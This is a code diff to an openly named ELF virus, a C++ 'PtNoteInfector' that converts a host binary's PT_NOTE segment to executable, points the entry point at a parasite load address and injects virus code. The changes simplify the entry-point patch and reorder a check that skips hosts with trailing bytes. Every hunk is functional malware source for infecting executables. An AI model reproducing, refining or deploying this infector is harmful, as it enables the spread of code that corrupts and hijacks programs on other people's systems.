@@ -51,13 +51,8 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
   pt_note_to_be_infected->p_flags = PF_R + PF_X;
 }
 
-void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr parasite_load_address,
-                uint64_t virus_offset) {
-  if (ehdr.e_type == ET_EXEC) {
-    ehdr.e_entry = parasite_load_address;
-  } else {
-    ehdr.e_entry = parasite_load_address;
-  }
+void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr parasite_load_address) {
+  ehdr.e_entry = parasite_load_address;
 }
 
 }  // namespace
@@ -104,16 +99,6 @@ bool PtNoteInfector::analyze(std::span<const std::byte> host_mapping,
     // highest vaddress.
   }
 
-  // if in the rare case that host is some wierdo, that actually has data at the
-  // end of the file after section header table, do not infect because it's
-  // likely there are other issues preventing it from working. For example, the
-  // binary distributed by bazel does this https://github.com/bazelbuild/bazel
-  if (parasite_load_address_ <=
-      host_mapping.size() - ehdr.e_shnum * ehdr.e_shentsize) {
-    printf(STR_LITERAL("gave up because there are bytes appended\n"));
-    return false;
-  }
-
   auto sht_entry_count = ehdr.e_shnum;
   auto* shdr = reinterpret_cast<const Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
   auto shstrtab_idx = ehdr.e_shstrndx;
@@ -130,6 +115,16 @@ bool PtNoteInfector::analyze(std::span<const std::byte> host_mapping,
         return false;
       }
     }
+  }
+
+  // if in the rare case that host is some wierdo, that actually has data at the
+  // end of the file after section header table, do not infect because it's
+  // likely there are other issues preventing it from working. For example, the
+  // binary distributed by bazel does this https://github.com/bazelbuild/bazel
+  if (parasite_load_address_ <=
+      host_mapping.size() - ehdr.e_shnum * ehdr.e_shentsize) {
+    printf(STR_LITERAL("gave up because there are bytes appended\n"));
+    return false;
   }
 
   return true;
@@ -162,7 +157,7 @@ bool PtNoteInfector::inject(std::span<std::byte> host_mapping,
 
   {
     auto& mutable_ehdr = reinterpret_cast<Elf64_Ehdr&>(host_mapping.front());
-    patch_ehdr(mutable_ehdr, parasite_load_address_, virus_offset_);
+    patch_ehdr(mutable_ehdr, parasite_load_address_);
   }
 
   // Inject the virus.
